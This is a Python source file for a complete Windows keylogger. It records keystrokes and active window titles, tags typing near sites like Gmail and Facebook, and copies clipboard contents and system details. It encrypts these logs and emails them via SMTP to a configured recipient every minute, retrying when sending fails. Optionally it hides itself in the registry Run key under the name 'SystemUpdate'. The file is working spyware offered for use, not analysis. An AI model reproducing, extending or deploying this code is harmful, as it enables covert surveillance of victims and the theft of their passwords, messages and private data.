import os
import time
import socket
import platform
import datetime
import win32clipboard
import win32gui
import winreg 
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.hashes import SHA256
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# --------------------- CONFIGURATION AND SETTINGS -----------------------------

# 1. PATH CONFIGURATION
BASE_PATH = os.path.dirname(os.path.abspath(__file__))
LOG_DIRECTORY = os.path.join(BASE_PATH, "logs")
if not os.path.exists(LOG_DIRECTORY):
    os.makedirs(LOG_DIRECTORY)

# 2. FILE NAMES (We will timestamp them to enable log rotation)
#    e.g., key_log_20230301_150000.txt, etc.
def timestamped_filename(prefix, ext="txt"):
    return f"{prefix}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.{ext}"

# 3. KEYLOGGER INTERVAL / LOG ROTATION SETTINGS (in seconds)
LOG_INTERVAL = 60  # gather keystrokes in intervals of 60s
# After each interval, we finalize the current log file, encrypt it, and send it.

# 4. EMAIL SETTINGS (SMTP over TLS)
EMAIL_SENDER = "SENDER_EMAIL@gmail.com"
EMAIL_PASSWORD = "SENDER_PASSWORD"  # If using Gmail, generate an App Password
EMAIL_RECIPIENT = "RECIEVER_EMAIL@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587  # TLS port

# 5. OFFLINE CACHING: If email sending fails, store the encrypted files in a queue
OFFLINE_QUEUE = []

# 6. RSA KEY FOR DOUBLE ENCRYPTION (You could load your existing RSA key pair instead.)
#    We generate an RSA key pair once, for demonstration.
RSA_KEY_PATH = os.path.join(BASE_PATH, "rsa_private.pem")
RSA_PUBLIC_KEY_PATH = os.path.join(BASE_PATH, "rsa_public.pem")

# 7. STEALTH / STARTUP
#    Set RUN_AT_STARTUP to True if you want to attempt adding the script to registry
RUN_AT_STARTUP = False  # Windows only

# 8. SMART LOGGING KEYWORDS (If the user visits or types these, we can log more frequently)
SENSITIVE_KEYWORDS = ["facebook", "gmail", "confidential"]


# --------------------- IMPROVED DATA SECURITY ---------------------------------
#  - Implementing double encryption:
#     1) Generate a random AES key to encrypt the log files.
#     2) Encrypt that AES key with our RSA public key.
#  - The private key is stored locally in this demo.

def generate_rsa_keypair():
    """Generate an RSA keypair and save it locally if not existing."""
    if not os.path.exists(RSA_KEY_PATH) or not os.path.exists(RSA_PUBLIC_KEY_PATH):
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()

        # Store private key
        with open(RSA_KEY_PATH, "wb") as f:
            f.write(
                private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
            )

        # Store public key
        with open(RSA_PUBLIC_KEY_PATH, "wb") as f:
            f.write(
                public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
            )

def load_rsa_public_key():
    with open(RSA_PUBLIC_KEY_PATH, "rb") as f:
        public_key = serialization.load_pem_public_key(f.read())
    return public_key

def load_rsa_private_key():
    with open(RSA_KEY_PATH, "rb") as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None)
    return private_key

def encrypt_with_rsa(data_bytes, public_key):
    """Encrypt bytes (the AES key) using RSA public key."""
    encrypted = public_key.encrypt(
        data_bytes,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=SHA256()),
            algorithm=SHA256(),
            label=None
        )
    )
    return encrypted

# --------------------- KEYLOGGER CORE LOGIC -----------------------------------

keys_buffer = []
active_window = None

# Keeping track of the start time for each logging interval
interval_start_time = time.time()
current_log_filename = timestamped_filename("key_log")

def get_active_window_title():
    """Return the title of the current active window (Windows only)."""
    window_handle = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window_handle)

def on_press(key):
    """Callback when a key is pressed."""
    global keys_buffer, active_window

    # Smart logging: if certain keywords are detected in the active window, do special logic
    new_window = get_active_window_title()
    if new_window != active_window:
        active_window = new_window
        keys_buffer.append(f"\n[Active Window: {active_window}]\n")

    try:
        # Converting the key to readable format
        k = str(key.char)
    except AttributeError:
        # Special keys (e.g. CTRL, SHIFT, SPACE, etc.)
        k = f" [{key}] "

    # Additional check for SENSITIVE_KEYWORDS typed out
    # If typed text contains any sensitive keyword, we can do something special
    if any(kw.lower() in k.lower() for kw in SENSITIVE_KEYWORDS):
        keys_buffer.append("[SENSITIVE DETECTED] ")

    keys_buffer.append(k)

def on_release(key):
    """Callback when a key is released."""
    # If the user presses ESC, stop listening
    if key == Key.esc:
        return False

def run_keylogger_listener():
    """Start the keylogger listener until the interval is up."""
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def write_buffered_keys_to_file(filename):
    """Write the current buffer of keys to a file, then clear it."""
    global keys_buffer

    try:
        filepath = os.path.join(LOG_DIRECTORY, filename)
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write("".join(keys_buffer))
        keys_buffer = []
    except Exception as e:
        print(f"[Error writing keys to file] {e}")

# --------------------- CLIPBOARD & SYSTEM INFO --------------------------------

def copy_clipboard(filename):
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        filepath = os.path.join(LOG_DIRECTORY, filename)
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"\n[Clipboard - {datetime.datetime.now()}]\n{pasted_data}\n")

    except Exception as e:
        print(f"[Clipboard Error] {e}")

def computer_information(filename):
    try:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        sys_info = (
            f"Processor: {platform.processor()}\n"
            f"System: {platform.system()} {platform.version()}\n"
            f"Machine: {platform.machine()}\n"
            f"Hostname: {hostname}\n"
            f"IP Address: {IPAddr}\n"
            f"Date/Time: {datetime.datetime.now()}\n"
        )
        filepath = os.path.join(LOG_DIRECTORY, filename)
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(sys_info)
    except Exception as e:
        print(f"[System Info Error] {e}")


# --------------------- ENCRYPT & SEND LOGIC -----------------------------------

def encrypt_and_send_file(file_to_encrypt):
    """
    1) Generate a random Fernet (AES) key.
    2) Encrypt that key with RSA public key.
    3) Encrypt file contents with the Fernet key.
    4) Email the encrypted file and the RSA-encrypted AES key.
    5) If sending fails, store in OFFLINE_QUEUE for a later retry.
    """
    try:
        # Step 1: Random AES key
        aes_key = Fernet.generate_key()
        fernet = Fernet(aes_key)

        # Step 2: Encrypt AES key with RSA public key
        public_key = load_rsa_public_key()
        enc_aes_key = encrypt_with_rsa(aes_key, public_key)

        # Step 3: Encrypt file contents
        with open(os.path.join(LOG_DIRECTORY, file_to_encrypt), 'rb') as original_file:
            original_data = original_file.read()
        encrypted_data = fernet.encrypt(original_data)

        # Write the encrypted log file
        encrypted_filename = file_to_encrypt + ".enc"
        encrypted_filepath = os.path.join(LOG_DIRECTORY, encrypted_filename)
        with open(encrypted_filepath, 'wb') as enc_file:
            enc_file.write(encrypted_data)

        # Write the RSA-encrypted AES key to a separate file
        key_filename = file_to_encrypt + ".key"
        key_filepath = os.path.join(LOG_DIRECTORY, key_filename)
        with open(key_filepath, 'wb') as key_file:
            key_file.write(enc_aes_key)

        # Step 4: Email both encrypted file and the RSA-encrypted AES key
        try_send_email([encrypted_filepath, key_filepath])

    except Exception as e:
        print(f"[Encrypt & Send Error] {e}")
        # If the program fail at any point, queue the file for later
        OFFLINE_QUEUE.append(file_to_encrypt)

def try_send_email(file_paths):
    """Send the specified files as attachments via SMTP. If sending fails, queue them."""
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECIPIENT
        msg['Subject'] = "Keylogger Data"
        body = "Encrypted keylogger data attached."
        msg.attach(MIMEText(body, 'plain'))

        for file_path in file_paths:
            filename = os.path.basename(file_path)
            with open(file_path, "rb") as attachment:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename= {filename}")
            msg.attach(p)

        s = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        s.starttls()
        s.login(EMAIL_SENDER, EMAIL_PASSWORD)
        s.sendmail(EMAIL_SENDER, EMAIL_RECIPIENT, msg.as_string())
        s.quit()
        print("[Email Sent Successfully]")

    except Exception as e:
        print(f"[Email Sending Failed] {e}")
        for fp in file_paths:
            # If sending fails, queue them for later
            OFFLINE_QUEUE.append(os.path.basename(fp))

def retry_offline_queue():
    """Try sending any files that were queued after a failure."""
    if not OFFLINE_QUEUE:
        return
    print(f"[Retrying offline queue: {OFFLINE_QUEUE}]")
    pending = OFFLINE_QUEUE[:]
    OFFLINE_QUEUE.clear()
    for original_file in pending:
        # Re-run the encryption & sending step
        if original_file.endswith(".enc") or original_file.endswith(".key"):
            # If we already had encrypted files in the queue, try to send them directly
            try_send_email([os.path.join(LOG_DIRECTORY, original_file)])
        else:
            # It's an original log file that we never encrypted
            encrypt_and_send_file(original_file)

# --------------------- LOG INTERVAL & STEALTH ---------------------------------

def attempt_run_at_startup():
    """Create a registry entry so the script runs at startup (Windows)."""
    try:
        script_path = os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        print("[Run at Startup] Registry key set successfully.")
    except Exception as e:
        print(f"[Startup Registration Failed] {e}")


# --------------------- MAIN LOOP ----------------------------------------------

def main():
    # 1. Generate RSA keypair if not present
    generate_rsa_keypair()

    # 2. Optionally try to set the script to run at startup
    if RUN_AT_STARTUP:
        attempt_run_at_startup()

    # 3. Continuously run in intervals
    while True:
        global current_log_filename
        start_time = time.time()

        # Keylogging until LOG_INTERVAL passes
        print("[Keylogging Started for this interval]")
        run_keylogger_listener()

        # After listener stops (e.g., ESC or time passes), write to the log
        write_buffered_keys_to_file(current_log_filename)

        # Also capture system info & clipboard each interval
        system_file = timestamped_filename("system_info")
        computer_information(system_file)

        clipboard_file = timestamped_filename("clipboard_info")
        copy_clipboard(clipboard_file)

        # 4. Encrypt & send the logs from this interval
        #    (key_log, system_info, and clipboard_info)
        try:
            encrypt_and_send_file(current_log_filename)
            encrypt_and_send_file(system_file)
            encrypt_and_send_file(clipboard_file)
        except Exception as e:
            print(f"[Error in encrypt_and_send_file] {e}")

        # 5. Attempt to resend any offline-queued files
        retry_offline_queue()

        # 6. Prepare next interval’s filenames
        current_log_filename = timestamped_filename("key_log")

        # 7. Sleep for the remainder of the interval if time remains
        end_time = time.time()
        elapsed = end_time - start_time
        if elapsed < LOG_INTERVAL:
            time.sleep(LOG_INTERVAL - elapsed)

if __name__ == "__main__":
    main()
